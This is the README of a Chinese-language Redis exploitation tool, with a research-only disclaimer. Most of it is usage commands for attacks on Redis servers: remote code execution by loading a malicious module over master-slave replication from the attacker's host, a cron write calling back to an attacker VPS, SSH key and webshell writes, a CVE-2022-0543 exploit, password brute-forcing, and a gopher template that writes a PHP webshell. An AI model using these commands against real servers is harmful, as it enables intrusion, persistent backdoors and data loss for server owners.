## Redis 漏洞利用工具


### 声明

**本工具仅用于个人安全研究学习。由于传播、利用本工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，工具作者不为此承担任何责任。**

------

### 注意

**主从复制会清空数据，主从复制会清空数据，主从复制会清空数据，请注意使用！请注意使用！请注意使用！**

------

图文利用过程：[https://yuyan-sec.github.io/posts/redisexp/](https://yuyan-sec.github.io/posts/redisexp/)




```

██████╗ ███████╗██████╗ ██╗███████╗    ███████╗██╗  ██╗██████╗
██╔══██╗██╔════╝██╔══██╗██║██╔════╝    ██╔════╝╚██╗██╔╝██╔══██╗
██████╔╝█████╗  ██║  ██║██║███████╗    █████╗   ╚███╔╝ ██████╔╝
██╔══██╗██╔══╝  ██║  ██║██║╚════██║    ██╔══╝   ██╔██╗ ██╔═══╝
██║  ██║███████╗██████╔╝██║███████║    ███████╗██╔╝ ██╗██║
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝

基本连接: 
RedisExp.exe -r 192.168.19.1 -p 6379 -w 123456

主从复制命令执行：
RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]

主从复制上传文件：
RedisExp.exe -m upload -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port -rp 目标路径 -rf 目标文件名 -lf 本地文件

主动关闭主从复制：
RedisExp.exe -m close -r 目标IP -p 目标端口 -w 密码

写计划任务：
RedisExp.exe -m cron -r 目标IP -p 目标端口 -w 密码 -L VpsIP -P VpsPort

写SSH 公钥：
RedisExp.exe -m ssh -r 目标IP -p 目标端口 -w 密码 -u 用户名 -s 公钥

写webshell：
RedisExp.exe -m shell -r 目标IP -p 目标端口 -w 密码 -rp 目标路径 -rf 目标文件名 -s Webshell内容 [base64内容使用 -b 来解码]

CVE-2022-0543：
RedisExp.exe -m cve -r 目标IP -p 目标端口 -w 密码 -c 执行命令

爆破Redis密码：
RedisExp.exe -m brute -r 目标IP -p 目标端口 -f 密码字典

生成gohper：
RedisExp.exe -m gopher -r 目标IP -p 目标端口 -f gopher模板文件

执行 bgsave：
RedisExp.exe -m bgsave -r 目标IP -p 目标端口 -w 密码

判断文件：
RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf c:\windows\win.ini
```

gopher 写webshell模板
```
flushall
config set dir /tmp
config set dbfilename shell.php
set 'webshell' '<?php phpinfo();?>'
save
```

关闭Redis压缩(写入乱码的时候可以关闭压缩，工具在写入shell的时候默认添加了关闭压缩，写入后再恢复开启压缩)
```
config set rdbcompression no
```


1. 具体命令使用 -h 来查看
2. exp.dll 和 exp.so 来自 https://github.com/0671/RabR 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。
3. Windows 中文路径需要设置gbk，使用 -g 参数就可以了。
4. 在写入webshell的时候因为有一些特殊字符，可以使用把webshell进行 base64 编码，然后使用 -b 参数来解码



### 报错

```
工具报错：[ERR Error loading the extension. Please check the server logs.]        module load /tmp/exp.so

服务端报错：Module /tmp/exp.so failed to load: It does not have execute permissions.
```

有可能是 Redis 版本太高， exp.so 没有执行权限导致加载不了。具体需要查看服务端的报错



### 参考

本工具基于大量优秀文章和工具才得以~~编写~~ 抄写完成，非常感谢这些无私的分享者！

- https://github.com/zyylhn/redis_rce
- https://github.com/0671/RabR
- https://github.com/r35tart/RedisWriteFile
- https://github.com/toalaska/redis_tool
- https://yanghaoi.github.io/2021/10/09/redis-lou-dong-li-yong/
- https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher
- [原创 Paper | Windows 与 Java 环境下的 Redis 利用分析](https://mp.weixin.qq.com/s/f7hPOoSSiRJpyMK51_Vxrw)



